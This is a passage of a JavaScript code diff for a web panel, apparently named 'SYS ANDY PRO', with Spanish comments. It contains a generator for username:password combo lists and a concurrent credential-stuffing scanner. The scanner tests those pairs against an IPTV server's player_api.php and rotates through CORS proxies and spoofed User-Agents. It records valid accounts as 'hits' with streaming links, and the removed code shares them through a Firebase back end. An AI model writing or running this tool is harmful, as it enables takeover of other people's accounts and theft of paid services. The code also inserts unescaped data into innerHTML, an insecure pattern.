-                    await addDoc(collection(db, "bloc_notas_vip"), itemPayload);
-                }
-                document.getElementById('noteTitle').value = "";
-                document.getElementById('noteContent').value = "";
-            } catch (e) { alert("Error en el bloc."); }
-        };
+        const hitsCount1 = $('hitsCount1'), hitsCount2 = $('hitsCount2'), hitsCount3 = $('hitsCount3');
+        const progressBarFill = $('progressBarFill'), progressText = $('progressText'), currentCombo = $('currentCombo');
+        const progressBarFill2 = $('progressBarFill2'), progressText2 = $('progressText2'), currentCombo2 = $('currentCombo2');
+        const progressBarFill3 = $('progressBarFill3'), progressText3 = $('progressText3'), currentCombo3 = $('currentCombo3');
 
-        document.getElementById('btnCancelarEdit').onclick = () => {
-            document.getElementById('editNoteId').value = "";
-            document.getElementById('noteTitle').value = "";
-            document.getElementById('noteContent').value = "";
-            document.getElementById('btnCancelarEdit').classList.add('hidden');
-            document.getElementById('btnGuardarNota').innerText = "Guardar Registro";
-        };
-
-        function escucharNotas() {
-            // El Owner ve absolutamente todo, el usuario normal solo sus credenciales asignadas
-            let q = query(collection(db, "bloc_notas_vip"), orderBy("timestamp", "desc"));
-            if (sesionUsuario.role !== "owner") {
-                q = query(collection(db, "bloc_notas_vip"), where("usuarioId", "==", sesionUsuario.id), orderBy("timestamp", "desc"));
-            }
-            
-            onSnapshot(q, (snapshot) => {
-                const list = document.getElementById('notesList');
-                list.innerHTML = "";
-                snapshot.forEach((docSnap) => {
-                    const id = docSnap.id; const data = docSnap.data();
-                    const cleanContent = data.contenido.replace(/"/g, '&quot;').replace(/'/g, "\\'");
-                    const card = document.createElement('div');
-                    card.className = "note-card";
-                    card.innerHTML = `
-                        <strong>📌 ${data.titulo}</strong>
-                        <p>${data.contenido}</p>
-                        <div class="note-meta">Por: ${data.autor}</div>
-                        <div class="note-actions">
-                            <button class="btn-mini" style="background:#00a884;" onclick="copiarTexto('${cleanContent}')">Copiar</button>
-                            <button class="btn-mini" style="background:#0033A0;" onclick="prepararEdicion('${id}', '${data.titulo.replace(/'/g, "\\'")}', '${cleanContent}')">Editar</button>
-                            <button class="btn-mini" style="background:#D52B1E;" onclick="eliminarNota('${id}')">Eliminar</button>
-                        </div>
-                    `;
-                    list.appendChild(card);
-                });
-            });
-        }
-
-        window.copiarTexto = function(texto) {
-            navigator.clipboard.writeText(texto).then(() => alert("Copiado.")).catch(() => alert("Error al copiar."));
-        };
-
-        window.prepararEdicion = function(id, titulo, contenido) {
-            document.getElementById('editNoteId').value = id;
-            document.getElementById('noteTitle').value = titulo;
-            document.getElementById('noteContent').value = contenido;
-            document.getElementById('btnCancelarEdit').classList.remove('hidden');
-            document.getElementById('btnGuardarNota').innerText = "Actualizar Registro";
-        };
-
-        window.eliminarNota = async function(id) {
-            if (confirm("¿Eliminar nota?")) await deleteDoc(doc(db, "bloc_notas_vip", id));
-        };
-
-        // ================= ALGORITMO GENERADOR DE COMBOS =================
-        const nombres = ["juan","luis","pedro","carlos","miguel","jose","manuel","daniel","ricardo","antonio","andres","alejandro","alberto","adrian","armando","bruno","benjamin","boris","cesar","cristian","claudio","camilo","david","diego","dario","edgar","eduardo","edwin","esteban","felipe","fernando","francisco","fabian","gabriel","gustavo","gerardo","hector","hugo","ismael","ivan","ignacio","jorge","jesus","julio","jaime","kevin","leonardo","lucas","martin","marcos","mateo","mauricio","nelson","nicolas","oscar","orlando","pablo","patricio","raul","roberto","ramon","rodrigo","sebastian","sergio","santiago","tomas","victor","walter","wilson","yahir","yoel","alex","alan","aaron","angelo","cristobal","damian","dilan","edson","erick","fabio","franco","gonzalo","harold","ian","jonathan","julian","leandro","mariano","maximo","natan","octavio","paolo","renato","samuel","thiago","ulises","valentin","xavier","sofia","valentina","camila","isabella","martina","lucia","daniela","paula","carla","maria","laura","patricia","andrea","mariana","gabriela","fernanda","veronica","claudia","carmen","rosa","silvia","gloria","elena","adriana","beatriz","lorena","ines","noelia","natalia","tatiana","angela","antonia","alicia","irene","monica","raquel","teresa","susana","sonia","diana","karla","brenda","melissa","pamela","jessica","vanessa","marcela","bianca","renata","carolina","valeria","paulina","jimena","alejandra","nuria","lourdes","esther","rocio","pilar","amanda","araceli","leticia","yolanda","florencia","miriam","celeste","samanta","luisa"];
-
-        function randomString(length) {
-            const chars = "abcdefghijklmnopqrstuvwxyz0123456789"; let result = "";
-            for (let i = 0; i < length; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
-            return result;
-        }
-
-        function alternarMayusculas(texto) {
-            let resultado = "";
-            for (let i = 0; i < texto.length; i++) resultado += Math.random() > 0.5 ? texto[i].toUpperCase() : texto[i].toLowerCase();
-            return resultado;
-        }
-
-        function generarNombreInfinito() {
-            const prefijos = ["ju", "lu", "pe", "ca", "mi", "jo", "ma", "da", "ri", "an", "al", "br", "be", "ce", "cr", "cl", "di", "ed", "es", "fe", "fr", "ga", "gu", "he", "iv", "je", "ke", "le", "ma", "ne", "ni", "os", "pa", "ra", "ro", "se", "sa", "to", "vi", "wa"];
-            const raices = ["an", "is", "dr", "rl", "gu", "os", "nu", "ni", "ca", "nt", "ber", "ria", "man", "un", "nja", "or", "sa", "ist", "aud"];
-            const sufijos = ["an", "is", "dro", "los", "guel", "se", "uel", "niel", "ardo", "nio", "dres", "andro", "to", "rian", "do"];
-            let n = prefijos[Math.floor(Math.random() * prefijos.length)] + raices[Math.floor(Math.random() * raices.length)] + sufijos[Math.floor(Math.random() * sufijos.length)];
-            return n.replace(/[^a-zA-Z]/g, "").substring(0, 8);
-        }
-
-        document.getElementById('btnGenerarCombos').onclick = () => {
-            let cantidad = parseInt(document.getElementById("cantidad").value) || 100;
-            let longitud = parseInt(document.getElementById("longitud").value) || 8;
-            let tipo = document.getElementById("tipo").value; let anio = document.getElementById("anio").value; let sep = document.getElementById("sep").value;
-            let output = "";
-
-            for (let i = 0; i < cantidad; i++) {
-                let user = "", pass = "";
-                if (tipo == "random") { user = randomString(6); pass = randomString(longitud); }
-                if (tipo == "email") { user = randomString(6) + "@gmail.com"; pass = randomString(longitud); }
-                if (tipo == "nombre") { user = nombres[Math.floor(Math.random() * nombres.length)]; pass = randomString(longitud); }
-                if (tipo == "nombrenombre") { user = nombres[Math.floor(Math.random() * nombres.length)] + ":" + nombres[Math.floor(Math.random() * nombres.length)]; }
-                if (tipo == "nombreigual") { let n = nombres[Math.floor(Math.random() * nombres.length)]; user = n; pass = n; }
-                if (tipo == "andymix") {
-                    let m1 = alternarMayusculas(generarNombreInfinito()); let m2 = alternarMayusculas(generarNombreInfinito());
-                    let n1 = Math.floor(Math.random() * 900) + 100; let n2 = Math.floor(Math.random() * 9000) + 1000;
-                    let st = Math.floor(Math.random() * 4);
-                    if (st == 0) { user = m1 + n1; pass = m2 + n2; } 
-                    else if (st == 1) { user = m1 + n1; pass = n1 + m2; } 
-                    else if (st == 2) { user = n1 + m1; pass = m2 + n2; } 
-                    else { user = m1.toUpperCase() + n1; pass = n2 + m2.toLowerCase(); }
-                }
-                if (anio != "" && pass != "") pass = pass + anio;
-                output += (pass != "") ? user + sep + pass + "\n" : user + "\n";
-            }
-            document.getElementById("resultado").value = output;
-        };
-
-        document.getElementById('btnDescargarCombos').onclick = () => {
-            let t = document.getElementById("resultado").value; if(!t) return alert("Genera combos primero.");
-            let b = new Blob([t], { type: "text/plain" }); let l = document.createElement("a");
-            l.href = URL.createObjectURL(b); l.download = "combos_andy.txt"; l.click();
-        };
-
-        // ================= NUEVA ARQUITECTURA: TRIPLE ESCÁNER MUNRRA TV PROFESIONAL =================
-        let isRunning = false;
-        let stopRequested = false;
+        let isRunning = false, stopRequested = false;
+        let serverIP = null, serverGeo = null;
         let combos1 = [], combos2 = [], combos3 = [], combosTxt = [];
         const HITS = { 1: [], 2: [], 3: [] };
         let JOB_PROXIES = {};
 
-        const CORS_PROXIES = [
-            'https://corsproxy.io/?{url}',
-            'https://api.allorigins.win/raw?url={url}',
-            'https://cors.isomorphic-git.org/{url}',
-            'https://thingproxy.freeboard.io/fetch/{url}'
-        ];
-
-        let audioCtx = null;
-        function playHitSound() {
-            if (!document.getElementById('soundToggle').checked) return;
-            try {
-                if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const o = audioCtx.createOscillator(), g = audioCtx.createGain();
-                o.type = 'sine'; o.frequency.setValueAtTime(880, audioCtx.currentTime);
-                g.gain.setValueAtTime(0, audioCtx.currentTime);
-                g.gain.linearRampToValueAtTime(0.22, audioCtx.currentTime + 0.01);
-                g.gain.exponentialRampToValueAtTime(0.0008, audioCtx.currentTime + 0.18);
-                o.connect(g); g.connect(audioCtx.destination); o.start(); o.stop(audioCtx.currentTime + 0.2);
-            } catch (_) {}
+        function randomUA(){
+            const uas = [
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
+                "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36",
+                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15"
+            ];
+            return uas[Math.floor(Math.random()*uas.length)];
         }
 
-        function limpiarHost(host) { return host.replace(/^https?:\/\//, '').trim(); }
+        function limpiarHost(host){ return host.replace(/^https?:\/\//,'').trim(); }
 
-        function extractCombo(line) {
-            if (!line) return null;
-            let s = String(line).normalize('NFKC').replace(/\s+/g, ' ').trim();
+        function extractCombo(line){
+            if(!line) return null;
+            let s = String(line).normalize('NFKC').replace(/\s+/g,' ').trim();
             const m = s.match(/([^:\s][^:\n\r]*)\s*:\s*([^:\s][^\n\r]*)/u);
-            if (!m) return null;
+            if(!m) return null;
             return [m[1].trim(), m[2].trim()];
         }
 
-        function readTxtFile(inputEl, targetArray) {
+        function updateStartState(){
+            const hasHost = !!hostInput.value.trim();
+            const hasAnyCombos = (combos1.length || combos2.length || combos3.length || combosTxt.length);
+            startBtn.disabled = !(hasHost && hasAnyCombos);
+        }
+
+        // Web Audio para Alertas Inmediatas
+        let audioCtx = null;
+        function unlockAudio(){
+            try {
+                if(audioCtx) return;
+                const Ctx = window.AudioContext || window.webkitAudioContext;
+                if(Ctx) audioCtx = new Ctx();
+            }catch(_){}
+        }
+
+        function playHitSound(){
+            if(!soundToggle.checked || !audioCtx) return;
+            try {
+                const o = audioCtx.createOscillator(), g = audioCtx.createGain();
+                o.type = 'sine'; o.frequency.setValueAtTime(880, audioCtx.currentTime);
+                g.gain.setValueAtTime(0, audioCtx.currentTime);
+                g.gain.linearRampToValueAtTime(0.22, audioCtx.currentTime+0.01);
+                g.gain.exponentialRampToValueAtTime(0.0008, audioCtx.currentTime+0.18);
+                o.connect(g); g.connect(audioCtx.destination); o.start(); o.stop(audioCtx.currentTime+0.2);
+                if(navigator.vibrate) navigator.vibrate(80);
+            }catch(_){}
+        }
+
+        async function fetchTimeout(resource, options={}){
+            const {timeout=6000} = options;
+            const controller = new AbortController();
+            const id = setTimeout(() => controller.abort(), timeout);
+            try { return await fetch(resource, {...options, signal:controller.signal}); } 
+            finally { clearTimeout(id); }
+        }
+
+        async function fetchWithCors(url, options = {}, jobId = null){
+            const baseOpts = { cache:'no-store', ...options };
+            if(jobId && JOB_PROXIES[jobId]){
+                try {
+                    const proxied = JOB_PROXIES[jobId].replace('{url}', encodeURIComponent(url));
+                    const r = await fetchTimeout(proxied, baseOpts);
+                    if(r && r.ok) return r;
+                }catch(_){}
+            }
+            try {
+                const r = await fetchTimeout(url, baseOpts);
+                if(r && r.ok) return r;
+            }catch(e){
+                if(!useCors.checked) throw e;
+            }
+            const pool = [...CORS_PROXIES].filter(tpl => JOB_PROXIES[jobId] !== tpl);
+            for(const tpl of pool.sort(()=>Math.random()-0.5)){
+                try {
+                    const proxied = tpl.replace('{url}', encodeURIComponent(url));
+                    const r = await fetchTimeout(proxied, baseOpts);
+                    if(r && r.ok) return r;
+                }catch(_){}
+            }
+            throw new Error('Error de conexión total');
+        }
+
+        async function resolveIP(domain){
+            try {
+                const clean = domain.split(':')[0];
+                if(/^\d+\.\d+\.\d+\.\d+$/.test(clean)) return clean;
+                const res = await fetch(`https://dns.google/resolve?name=${clean}&type=A`);
+                const data = await res.json();
+                return data.Answer?.find(a=>a.type===1)?.data || null;
+            }catch{ return null; }
+        }
+
+        function uiFor(job){
+            if(job === 1) return { fill: progressBarFill, text: progressText, user: currentCombo, hitsCountEl: hitsCount1, hitsArr: HITS[1] };
+            if(job === 2) return { fill: progressBarFill2, text: progressText2, user: currentCombo2, hitsCountEl: hitsCount2, hitsArr: HITS[2] };
+            return { fill: progressBarFill3, text: progressText3, user: currentCombo3, hitsCountEl: hitsCount3, hitsArr: HITS[3] };
+        }
+
+        async function validarCombo(host, combo, opts = {}, ui = null, jobId = null){
+            try {
+                if(stopRequested) return null;
+                const pair = Array.isArray(combo) ? combo : extractCombo(combo);
+                if(!pair) return null;
+                const [user, pass] = pair;
+
+                if(ui?.user) ui.user.textContent = `Usuario actual: ${user}:${pass}`;
+
+                const protos = ['http://', 'https://'];
+                let data = null, usedProto = 'http://';
+
+                for(const p of protos){
+                    const url = `${p}${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
+                    try {
+                        const res = await fetchWithCors(url, opts, jobId);
+                        if(res.ok) { data = await res.json(); usedProto = p; break; }
+                    }catch(_){}
+                }
+                if(!data) return null;
+
+                const uinfo = data.user_info || {};
+                const ok = (uinfo.status==='Active') || String(uinfo.auth)==='1' || String(uinfo.auth).toLowerCase()==='true';
+                if(!ok) return null;
+
+                const porta = host.includes(':') ? host.split(':')[1] : (usedProto==='https://' ? '443' : '80');
+                const maxConns = uinfo.max_connections ?? 'N/D';
+                const activeCons = uinfo.active_cons ?? '0';
+                const expira = uinfo.exp_date ? new Date(uinfo.exp_date*1000).toLocaleDateString('es-ES') : 'Ilimitado';
+
+                const texto = `🔥 HIT ENCONTRADO 🔥\n🌐 Host: ${host}\n🚪 Puerto: ${porta}\n👤 Usuario: ${user}\n🔑 Pass: ${pass}\n⏳ Expira: ${expira}\n👥 Max Conexiones: ${maxConns}\n🔌 Activas: ${activeCons}\n🔗 Link M3U: ${usedProto}${host}/get.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&type=m3u_plus`;
+
+                return { texto, user, pass };
+            }catch{ return null; }
+        }
+
+        function mostrarHit(hit, ui){
+            const div = document.createElement('div');
+            div.className = 'hit-block';
+            div.innerHTML = `<div class="hit-header">👤 ${hit.user} | 🔑 ${hit.pass}</div><pre class="hit-content">${hit.texto}</pre>`;
+            hitsContainer.prepend(div);
+
+            if(ui.hitsCountEl){
+                ui.hitsCountEl.innerHTML = `Hits: <span class="yellow-hit">${ui.hitsArr.length}</span>`;
+            }
+            playHitSound();
+        }
+
+        async function processarCombosJob(host, combos, conc, jobId){
+            const ui = uiFor(jobId);
+            ui.hitsArr.length = 0;
+            let total = combos.length, processed = 0, index = 0;
+
+            async function worker(){
+                while(index < total && !stopRequested){
+                    const i = index++;
+                    if(i >= total) break;
+
+                    const combo = combos[i];
+                    if(!combo) continue;
+
+                    let opts = { headers: { "User-Agent": randomUA(), "Accept": "application/json" } };
+                    try {
+                        const hit = await validarCombo(host, combo, opts, ui, jobId);
+                        if(hit) { ui.hitsArr.push(hit); mostrarHit(hit, ui); }
+                    }catch(_){}
+                    finally {
+                        processed++;
+                        const pct = total === 0 ? 0 : (processed / total) * 100;
+                        if(ui.fill) ui.fill.style.width = pct + '%';
+                        if(ui.text) ui.text.textContent = `Procesados: ${processed} / ${total}`;
+                    }
+                    await new Promise(r => setTimeout(r, 50 + Math.random()*50));
+                }
+            }
+            await Promise.all(Array.from({ length: conc }, () => worker()));
+            if(ui.text) ui.text.textContent += stopRequested ? " | Detenido." : " | Finalizado.";
+        }
+
+        // Captura de archivos y texto
+        function readTxtFile(inputEl, targetArray){
             targetArray.length = 0;
             const f = inputEl.files?.[0];
-            if (!f) { updateStartState(); return; }
+            if(!f) { updateStartState(); return; }
             const r = new FileReader();
             r.onload = e => {
-                const lines = String(e.target.result || '').split(/\r?\n/);
-                for (const line of lines) {
+                String(e.target.result||'').split(/\r?\n/).forEach(line => {
                     const pair = extractCombo(line.trim());
-                    if (pair) targetArray.push(`${pair[0]}:${pair[1]}`);
-                }
+                    if(pair) targetArray.push(`${pair[0]}:${pair[1]}`);
+                });
                 updateStartState();
             };
             r.readAsText(f);
         }
 
-        document.getElementById('comboFile1').addEventListener('change', () => readTxtFile(document.getElementById('comboFile1'), combos1));
-        document.getElementById('comboFile2').addEventListener('change', () => readTxtFile(document.getElementById('comboFile2'), combos2));
-        document.getElementById('comboFile3').addEventListener('change', () => readTxtFile(document.getElementById('comboFile3'), combos3));
+        comboFile1.addEventListener('change', () => readTxtFile(comboFile1, combos1));
+        comboFile2.addEventListener('change', () => readTxtFile(comboFile2, combos2));
+        comboFile3.addEventListener('change', () => readTxtFile(comboFile3, combos3));
 
-        document.getElementById('comboText').addEventListener('input', () => {
+        comboText.addEventListener('input', () => {
             combosTxt.length = 0;
-            const raw = document.getElementById('comboText').value || '';
-            if (raw) {
-                const lines = raw.split(/\r?\n/);
-                for (const line of lines) {
-                    const pair = extractCombo(line);
-                    if (pair) combosTxt.push(`${pair[0]}:${pair[1]}`);
-                }
-            }
+            comboText.value.split(/\r?\n/).forEach(line => {
+                const pair = extractCombo(line);
+                if(pair) combosTxt.push(`${pair[0]}:${pair[1]}`);
+            });
             updateStartState();
         });
 
-        document.getElementById('hostInput').addEventListener('input', updateStartState);
+        hostInput.addEventListener('input', updateStartState);
 
-        function updateStartState() {
-            const hasHost = !!document.getElementById('hostInput').value.trim();
-            const hasAnyCombos = (combos1.length || combos2.length || combos3.length || combosTxt.length);
-            document.getElementById('startBtn').disabled = !(hasHost && hasAnyCombos);
-        }
+        // Control de los Botones
+        startBtn.addEventListener('click', async () => {
+            if(isRunning) return;
+            unlockAudio();
 
-        async function fetchTimeout(url, opts = {}, ms = 6000) {
-            const ctrl = new AbortController();
-            const id = setTimeout(() => ctrl.abort(), ms);
-            try {
-                const res = await fetch(url, { ...opts, signal: ctrl.signal });
-                clearTimeout(id);
-                return res;
-            } catch (e) {
-                clearTimeout(id);
-                throw e;
-            }
-        }
+            isRunning = true; stopRequested = false;
+            startBtn.disabled = true; stopBtn.disabled = false; saveBtn.disabled = true;
+            hitsContainer.textContent = '';
 
-        async function fetchWithCors(url, options = {}, jobId = null) {
-            if (document.getElementById('useCors').checked && jobId && JOB_PROXIES[jobId]) {
-                try {
-                    const proxied = JOB_PROXIES[jobId].replace('{url}', encodeURIComponent(url));
-                    return await fetchTimeout(proxied, options);
-                } catch (_) {}
-            }
-            return await fetchTimeout(url, options);
-        }
+            [hitsCount1, hitsCount2, hitsCount3].forEach(el => el.innerHTML = `Hits: <span class="yellow-hit">0</span>`);
+            [progressBarFill, progressBarFill2, progressBarFill3].forEach(el => el.style.width = '0%');
 
-        function formatHitText(h) {
-            const m3u = `http://${h.host}/get.php?username=${encodeURIComponent(h.user)}&password=${encodeURIComponent(h.pass)}&type=m3u_plus`;
-            return `╭─➤ 𝗛𝗶𝘁𝘀 ʙʏ 📡 LOS LOCOS SIN FRONTERAS 📡
-├● 🎧💥🔥 GRUPO L.S.F 🔥💥🎧
-├●🔸🌐Host ➤ http://${h.host}
-├●♦️🌍Real ➤ ${h.host}
-├🍁LSF 🔹
-├●🔸📡Port ➤ 80/8080
-├●♦️👩👩‍User ➤ ${h.user}
-├●♦️🔑🔑Pass ➤ ${h.pass}
-├─●🔸📆Exp ➤ ${h.exp}
-├─●🔸─●🔸─●🔸INTERNACIONAL
-├─●🔸Country➤ Global
-├──●🔸👩ActCon ➤ ${h.active}
-├──●🔸👪MaxCon ➤ ${h.max} 
-├─●🔸M3UValid ➤ ONLINE
-├─●🔸M3U url  ➤ ${m3u}
-├─●🅳🅸🆁🅴🅲🆃🅾─➤
-╰─➤🌟LOS LOCOS SIN FRONTERAS PREMIUM 24/7🌟`;
-        }
+            const host = limpiarHost(hostInput.value);
+            const baseConc = parseInt(concurrencyInput.value) || 80;
 
-        async function validarCombo(host, combo, ui, jobId) {
-            if (stopRequested) return null;
-            const pair = extractCombo(combo);
-            if (!pair) return null;
-            const [user, pass] = pair;
-
-            if (ui.user) ui.user.textContent = `Usuario actual: ${user}:${pass}`;
-
-            const protos = ['http://', 'https://'];
-            let data = null;
-
-            for (const p of protos) {
-                const url = `${p}${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
-                try {
-                    const res = await fetchWithCors(url, { cache: 'no-store' }, jobId);
-                    if (res.ok) { data = await res.json(); break; }
-                } catch (_) {}
-            }
-
-            if (!data || !data.user_info) return null;
-            const uinfo = data.user_info;
-            const ok = (uinfo.status === 'Active') || String(uinfo.auth) === '1' || String(uinfo.auth).toLowerCase() === 'true';
-            if (!ok || uinfo.status === 'Expired' || uinfo.status === 'Banned') return null;
-
-            return {
-                user, pass, host,
-                exp: uinfo.exp_date ? new Date(uinfo.exp_date * 1000).toISOString().replace('T',' ').split('.')[0] : "Ilimitada",
-                max: uinfo.max_connections || "1",
-                active: uinfo.active_cons || "0"
-            };
-        }
-
-        function uiFor(job) {
-            return {
-                fill: document.getElementById(job === 1 ? 'progressBarFill' : (job === 2 ? 'progressBarFill2' : 'progressBarFill3')),
-                text: document.getElementById(job === 1 ? 'progressText' : (job === 2 ? 'progressText2' : 'progressText3')),
-                user: document.getElementById(job === 1 ? 'currentCombo' : (job === 2 ? 'currentCombo2' : 'currentCombo3')),
-                hitsCountEl: document.getElementById(job === 1 ? 'hitsCount1' : (job === 2 ? 'hitsCount2' : 'hitsCount3')),
-                hitsArr: HITS[job]
-            };
-        }
-
-        async function processarCombosJob(host, combos, conc, jobId) {
-            const ui = uiFor(jobId);
-            ui.hitsArr.length = 0;
-            
-            let total = combos.length;
-            let processed = 0;
-            let index = 0;
-
-            const sleep = ms => new Promise(r => setTimeout(r, ms));
-
-            async function worker() {
-                while (index < total && !stopRequested) {
-                    const i = index++;
-                    if (i >= total) break;
-
-                    const hit = await validarCombo(host, combos[i], ui, jobId);
-                    if (stopRequested) break;
-
-                    if (hit) {
-                        ui.hitsArr.push(hit);
-                        playHitSound();
-                        const formatted = formatHitText(hit);
-
-                        // Guardar en la Web vinculando el ID único del usuario activo
-                        try {
-                            await addDoc(collection(db, "hits_escaneados"), {
-                                host: hit.host, user: hit.user, pass: hit.pass, exp: hit.exp, max: hit.max, active: hit.active,
-                                textoFormateado: formatted, contadorCopias: 0, 
-                                usuarioId: sesionUsuario.id, // Vínculo estricto de Credencial
-                                timestamp: serverTimestamp()
-                            });
-                        } catch (err) {}
-
-                        const div = document.createElement('div'); div.className = 'hit-block';
-                        div.innerHTML = `[Guardado en Servidor Web...] <br>${formatted}`;
-                        document.getElementById('hitsContainer').prepend(div);
-                    }
-                    processed++;
-                    if (ui.fill) ui.fill.style.width = ((processed / total) * 100) + '%';
-                    if (ui.text) ui.text.textContent = `Procesados: ${processed} / ${total}`;
-                    if (ui.hitsCountEl) ui.hitsCountEl.innerHTML = `Hits: <span class="yellow-hit">${ui.hitsArr.length}</span>`;
-                    
-                    await sleep(50 + Math.random() * 100);
-                }
-            }
-
-            if (ui.text) ui.text.textContent = "Iniciando scan...";
-            await Promise.all(Array.from({ length: Math.min(conc, total) }, () => worker()));
-            if (ui.text) ui.text.textContent = stopRequested ? "Scan detenido." : "Scan finalizado.";
-        }
-
-        document.getElementById('startBtn').onclick = async () => {
-            if (isRunning) return;
-            isRunning = true;
-            stopRequested = false;
-
-            document.getElementById('startBtn').disabled = true;
-            document.getElementById('stopBtn').disabled = false;
-            document.getElementById('saveBtn').disabled = true;
-            document.getElementById('hitsContainer').innerHTML = '';
-
-            const host = limpiarHost(document.getElementById('hostInput').value);
-            const baseConc = parseInt(document.getElementById('concurrencyInput').value) || 80;
-
-            if (combosTxt.length) {
+            if(combosTxt.length){
                 combos1 = combos1.concat(combosTxt);
                 combosTxt = [];
-                document.getElementById('comboText').value = '';
+                comboText.value = '';
             }
 
-            JOB_PROXIES = { 
-                1: CORS_PROXIES[0], 
-                2: CORS_PROXIES[1 % CORS_PROXIES.length], 
-                3: CORS_PROXIES[2 % CORS_PROXIES.length] 
-            };
-
-            const activeJobs = [combos1.length > 0, combos2.length > 0, combos3.length > 0].filter(Boolean).length || 1;
-            const perConc = Math.max(1, Math.floor(baseConc / activeJobs));
+            const shuffled = [...CORS_PROXIES].sort(() => Math.random() - 0.5);
+            if(combos1.length) JOB_PROXIES[1] = shuffled[0];
+            if(combos2.length) JOB_PROXIES[2] = shuffled[1];
+            if(combos3.length) JOB_PROXIES[3] = shuffled[2];
 
             const jobs = [];
-            if (combos1.length) jobs.push(processarCombosJob(host, combos1, perConc, 1));
-            if (combos2.length) jobs.push(processarCombosJob(host, combos2, perConc, 2));
-            if (combos3.length) jobs.push(processarCombosJob(host, combos3, perConc, 3));
-
-            if (jobs.length === 0) {
-                isRunning = false;
-                updateStartState();
-                return;
-            }
+            if(combos1.length) jobs.push(processarCombosJob(host, combos1, Math.floor(baseConc/3)||20, 1));
+            if(combos2.length) jobs.push(processarCombosJob(host, combos2, Math.floor(baseConc/3)||20, 2));
+            if(combos3.length) jobs.push(processarCombosJob(host, combos3, Math.floor(baseConc/3)||20, 3));
 
             Promise.allSettled(jobs).then(() => {
-                isRunning = false;
-                document.getElementById('stopBtn').disabled = true;
-                document.getElementById('startBtn').disabled = false;
-                document.getElementById('saveBtn').disabled = false;
-
-                const totalHits = HITS[1].length + HITS[2].length + HITS[3].length;
-                if (document.getElementById('autoDownload').checked && totalHits > 0) {
-                    descargarHitsLocales();
-                }
-                updateStartState();
+                isRunning = false; stopBtn.disabled = true; startBtn.disabled = false; saveBtn.disabled = false;
+                
+                // Auto descargar si hay hits
+                const total = HITS[1].length + HITS[2].length + HITS[3].length;
+                if(autoDownload.checked && total > 0) $("saveBtn").click();
             });
-        };
+        });
 
-        document.getElementById('stopBtn').onclick = () => { stopRequested = true; };
+        stopBtn.addEventListener('click', () => { stopRequested = true; stopBtn.disabled = true; });
 
-        function descargarHitsLocales() {
-            const all = [...HITS[1], ...HITS[2], ...HITS[3]];
-            const txt = all.map(formatHitText).join('\n\n' + '='.repeat(40) + '\n\n');
-            const blob = new Blob([txt], { type: 'text/plain' });
+        saveBtn.addEventListener('click', () => {
+            let out = "=== HITS DETECTADOS EN SYS ANDY PRO ===\n\n";
+            [1,2,3].forEach(id => {
+                HITS[id].forEach(h => { out += h.texto + "\n---------------------\n"; });
+            });
+            const blob = new Blob([out], {type:'text/plain;charset=utf-8'});
             const a = document.createElement('a');
             a.href = URL.createObjectURL(blob);
-            a.download = `SCAN_GLOBAL_${limpiarHost(document.getElementById('hostInput').value)}.txt`;
-            a.click();
-        }
-        document.getElementById('saveBtn').onclick = descargarHitsLocales;
-
-        // ================= FILTRADO INDEPENDIENTE EN REALTIME (HITS DEL SERVIDOR) =================
-        function escucharHitsDB() {
-            // Regla de Oro: El Owner ve los de todos. El Admin solo ve lo procesado bajo su sesión activa
-            let q = query(collection(db, "hits_escaneados"), orderBy("timestamp", "desc"));
-            if (sesionUsuario.role !== "owner") {
-                q = query(collection(db, "hits_escaneados"), where("usuarioId", "==", sesionUsuario.id), orderBy("timestamp", "desc"));
-            }
-
-            onSnapshot(q, (snapshot) => {
-                const list = document.getElementById('dbHitsList');
-                list.innerHTML = "";
-                snapshot.forEach((docSnap) => {
-                    const id = docSnap.id; const data = docSnap.data();
-                    const div = document.createElement('div');
-                    div.className = "hit-block-db";
-                    
-                    let dateStr = "Fecha Pendiente";
-                    if(data.timestamp) { dateStr = new Date(data.timestamp.seconds * 1000).toLocaleString(); }
-
-                    div.innerHTML = `
-                        <div style="color:var(--wa-teal); font-size:11px; margin-bottom:4px;">📅 Escaneado el: ${dateStr}</div>
-                        <pre style="white-space: pre-wrap; font-size:12px; color:#fff;">${data.textoFormateado}</pre>
-                        <div><span class="counter-badge">Copias: ${data.contadorCopias || 0}</span></div>
-                        <button class="copy-btn" onclick="copiarYContarHit('${id}', \`${data.textoFormateado.replace(/`/g, '\\`').replace(/\$/g, '\\$')}\`)">COPIAR HIT</button>
-                    `;
-                    list.appendChild(div);
-                });
-            });
-        }
-
-        window.copiarYContarHit = async function(id, texto) {
-            navigator.clipboard.writeText(texto).then(async () => {
-                alert("Hit Copiado. Contador sincronizado en servidor.");
-                try {
-                    await updateDoc(doc(db, "hits_escaneados", id), { contadorCopias: increment(1) });
-                } catch(e){}
-            }).catch(() => alert("No se pudo copiar automáticamente."));
-        };
-
-        // ================= ADMINISTRADORES EN RED =================
-        document.getElementById('btnCrearAdmin').onclick = async () => {
-            const nomId = document.getElementById('newAdminName').value.trim();
-            const mail = document.getElementById('newAdminEmail').value.trim();
-            const pass = document.getElementById('newAdminPass').value.trim();
-            if (!nomId || !mail || !pass) return alert("Asigna credenciales completas.");
-
-            try {
-                await addDoc(collection(db, "usuarios_vip"), {
-                    identificacion: nomId, nombre: nomId, email: mail, pass: pass, role: "admin"
-                });
-                alert("Registrado.");
-                document.getElementById('newAdminName').value = ""; document.getElementById('newAdminEmail').value = ""; document.getElementById('newAdminPass').value = "";
-            } catch (e) { alert("Error de red."); }
-        };
-
-        function escucharAdmins() {
-            onSnapshot(collection(db, "usuarios_vip"), (snapshot) => {
-                const list = document.getElementById('adminsList'); list.innerHTML = "";
-                snapshot.forEach((docSnap) => {
-                    const data = docSnap.data(); const id = docSnap.id;
-                    const item = document.createElement('div'); item.className = "member-item";
-                    item.innerHTML = `
-                        <strong>👤 ${data.nombre || data.identificacion}</strong>
